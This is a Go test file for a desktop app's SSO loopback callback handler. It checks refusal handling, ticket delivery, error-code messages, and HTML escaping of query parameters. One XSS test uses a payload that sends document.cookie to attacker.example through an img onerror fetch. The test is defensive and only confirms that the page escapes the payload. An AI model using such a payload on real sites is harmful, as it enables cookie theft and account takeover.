package main

import (
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"
)

// TestDesktopCallbackHandler_ARefusalAnswersAtOnce is the desktop half of
// #2687: the cloud's OIDC callback redirects a REFUSED desktop sign-in to
// the loopback with ?sso_error=, and the listener hands the refusal to the
// waiting ConnectCloudSSO at once — the browser page says why, and no
// five-minute timeout is waited out.
func TestDesktopCallbackHandler_ARefusalAnswersAtOnce(t *testing.T) {
	ticketCh := make(chan string, 1)
	refusalCh := make(chan error, 1)
	srv := httptest.NewServer(desktopCallbackHandler("https://cloud.example", ticketCh, refusalCh))
	defer srv.Close()

	resp, err := http.Get(srv.URL + "/desktop-callback?sso_error=password_change_required&sso_provider=Keycloak")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("a refusal's browser page answered %d, want 400", resp.StatusCode)
	}
	if !strings.Contains(string(body), "password change") {
		t.Fatalf("the browser page does not say why: %s", body)
	}
	select {
	case err := <-refusalCh:
		if !strings.Contains(err.Error(), "https://cloud.example") || !strings.Contains(err.Error(), "password change") {
			t.Fatalf("the refusal the app surfaces reads %q — it must name the cloud and the reason", err)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("no refusal reached the app: the cloud's sso_error redirect was dropped")
	}
	select {
	case tok := <-ticketCh:
		t.Fatalf("a refusal also delivered a ticket %q", tok)
	default:
	}
}

// TestDesktopCallbackHandler_TheTicketPathIsUnchanged: the refusal channel is
// additive — an accepted sign-in still delivers its one-time ticket and its
// success page.
func TestDesktopCallbackHandler_TheTicketPathIsUnchanged(t *testing.T) {
	ticketCh := make(chan string, 1)
	refusalCh := make(chan error, 1)
	srv := httptest.NewServer(desktopCallbackHandler("https://cloud.example", ticketCh, refusalCh))
	defer srv.Close()

	resp, err := http.Get(srv.URL + "/desktop-callback?ticket=t-123")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("the ticket path answered %d, want 200", resp.StatusCode)
	}
	select {
	case tok := <-ticketCh:
		if tok != "t-123" {
			t.Fatalf("ticket = %q", tok)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("no ticket delivered")
	}
	select {
	case err := <-refusalCh:
		t.Fatalf("an accepted sign-in reported a refusal: %v", err)
	default:
	}
}

func TestDesktopSSORefusal_MapsTheCodes(t *testing.T) {
	for code, want := range map[string]string{
		"password_change_required": "password change",
		"link_required":            "already exists",
		"restricted":               "allow-listed",
		"state_expired":            "start again",
		"login_failed":             "didn't complete",
	} {
		if got := desktopSSORefusal(code, ""); !strings.Contains(got, want) {
			t.Errorf("desktopSSORefusal(%q) = %q, want it to carry %q", code, got, want)
		}
	}
}

// TestDesktopCallbackHandler_NoBranchOfTheLoopbackPageRendersMarkupItWasHanded
// walks the page from what the handler READS — the three query parameters of
// /desktop-callback — and demands that no branch render markup back. The
// refusal branch is the one that interpolates: its sentence carries the
// provider label the cloud puts in ?sso_provider=, which upstream is an org
// admin's free-text display_name, so the escaping belongs at the sink
// (ssoClosePage) rather than at this one caller.
func TestDesktopCallbackHandler_NoBranchOfTheLoopbackPageRendersMarkupItWasHanded(t *testing.T) {
	const payload = `<img src=x onerror="fetch('http://attacker.example/'+document.cookie)">`
	for _, tc := range []struct {
		name  string
		query url.Values
	}{
		{"the provider label of a refusal", url.Values{"sso_error": {"restricted"}, "sso_provider": {payload}}},
		{"the provider label of an unmapped code", url.Values{"sso_error": {payload}, "sso_provider": {payload}}},
		{"a ticket that is markup", url.Values{"ticket": {payload}}},
		{"no ticket at all", url.Values{"ticket": {""}, "sso_provider": {payload}}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			ticketCh := make(chan string, 1)
			refusalCh := make(chan error, 1)
			srv := httptest.NewServer(desktopCallbackHandler("https://cloud.example", ticketCh, refusalCh))
			defer srv.Close()
			resp, err := http.Get(srv.URL + "/desktop-callback?" + tc.query.Encode())
			if err != nil {
				t.Fatal(err)
			}
			defer resp.Body.Close()
			body, _ := io.ReadAll(resp.Body)
			page := string(body)
			// The sentence is the page's only text node: judged on its own
			// content, so an escaped "&lt;img" passes and a raw "<img" does
			// not — a substring test on the payload would read the escaped
			// form as a hit.
			sentence := pageSentence(t, page)
			if strings.ContainsAny(sentence, "<>") {
				t.Fatalf("the loopback page served markup it was handed, on its own origin:\n%s", page)
			}
			// It still READS as the value it was given: escaped, not
			// dropped — an operator must see which provider refused.
			if tc.query.Get("sso_error") != "" && !strings.Contains(sentence, "&lt;img") {
				t.Fatalf("the refusal page dropped the provider label instead of escaping it:\n%s", page)
			}
		})
	}
}

// pageSentence answers the text ssoClosePage put inside its one <p> element.
func pageSentence(t *testing.T, page string) string {
	t.Helper()
	open := strings.Index(page, "<p ")
	if open < 0 {
		t.Fatalf("no <p> element in the loopback page:\n%s", page)
	}
	start := strings.Index(page[open:], ">")
	if start < 0 {
		t.Fatalf("an unterminated <p> tag in the loopback page:\n%s", page)
	}
	rest := page[open+start+1:]
	end := strings.Index(rest, "</p>")
	if end < 0 {
		t.Fatalf("no </p> in the loopback page:\n%s", page)
	}
	return rest[:end]
}
